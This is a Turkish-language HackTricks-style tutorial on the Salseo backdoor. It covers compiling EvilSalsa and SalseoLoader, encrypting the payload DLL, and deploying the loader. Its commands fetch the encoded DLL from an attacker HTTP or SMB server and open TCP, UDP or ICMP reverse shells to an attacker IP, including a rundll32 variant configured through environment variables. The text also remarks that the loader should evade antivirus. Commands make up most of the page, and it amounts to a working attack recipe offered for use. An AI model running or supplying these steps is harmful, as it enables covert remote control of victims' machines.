# Salseo

{{#include ../banners/hacktricks-training.md}}

## Binaries' Derlenmesi

Github'dan kaynak kodunu indirin ve **EvilSalsa** ile **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.

Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer Windows x64 destekliyorsa, o mimari için derleyin).

**Mimariyi seçebilirsiniz** Visual Studio'da **sol "Build" Sekmesi** içindeki **"Platform Target"** kısmında.

(**Bu seçenekleri bulamazsanız **"Project Tab"**'ına tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)

![](<../images/image (132).png>)

Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlar içinde çalıştırılabilir dosyanın yolu görünecektir):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Arka Kapıyı Hazırlama

Öncelikle, **EvilSalsa.dll**'yı kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Tamam, şimdi Salseo ile ilgili her şeyi gerçekleştirmek için her şeye sahipsin: **encoded EvilDalsa.dll** ve **SalseoLoader'ın binary'si.**

**SalseoLoader.exe binary'sini makineye yükle. Hiçbir antivirüs tarafından tespit edilmemelidir...**

## **Arka kapıyı çalıştır**

### **TCP ters shell almak (HTTP üzerinden encoded dll indirme)**

nc'yi ters shell dinleyicisi olarak başlatmayı ve encoded evilsalsa'yı sunmak için bir HTTP sunucusu kurmayı unutma.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP ters shell almak (SMB üzerinden kodlanmış dll indirme)**

Ters shell dinleyicisi olarak bir nc başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu kurmayı unutmayın.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP ters shell almak (kurbanın içinde kodlanmış dll zaten mevcut)**

**Bu sefer ters shell almak için istemcide özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP Yanıtlarını Devre Dışı Bırak:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### İstemciyi çalıştır:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Kurbanın içinde, salseo şeyini çalıştıralım:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader'ı ana fonksiyonu dışa aktaran DLL olarak derleme

SalseoLoader projesini Visual Studio ile açın.

### Ana fonksiyondan önce ekleyin: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Bu proje için DllExport'ı yükleyin

#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'ye basın (ve açılan pencereyi kabul edin)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Proje klasörünüzde **DllExport.bat** ve **DllExport_Configure.bat** dosyaları belirdi.

### **U**ninstall DllExport

**Kaldır**'a basın (evet, garip ama bana güvenin, bu gerekli)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Visual Studio'dan çıkın ve DllExport_configure'ı çalıştırın**

Sadece **çıkın** Visual Studio'dan

Sonra, **SalseoLoader klasörünüze** gidin ve **DllExport_Configure.bat**'ı çalıştırın.

**x64**'ü seçin (eğer x64 bir kutu içinde kullanacaksanız, benim durumum buydu), **System.Runtime.InteropServices**'i seçin ( **DllExport için Ad Alanı** içinde) ve **Uygula**'ya basın.

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Projeyi tekrar Visual Studio ile açın**

**\[DllExport]** artık hata olarak işaretlenmemelidir.

![](<../images/image (8) (1).png>)

### Çözümü derleyin

**Çıktı Türü = Sınıf Kütüphanesi**'ni seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıktı türü = Sınıf Kütüphanesi)

![](<../images/image (10) (1).png>)

**x64** **platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)

![](<../images/image (9) (1) (1).png>)

Çözümü **derlemek** için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolu görünecektir)

### Üretilen Dll'yi test edin

Dll'yi test etmek istediğiniz yere kopyalayın ve yapıştırın.

Çalıştırın:
```
rundll32.exe SalseoLoader.dll,main
```
Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!

## DLL kullanarak bir shell alın

Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyicisi** ayarlamayı unutmayın.

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
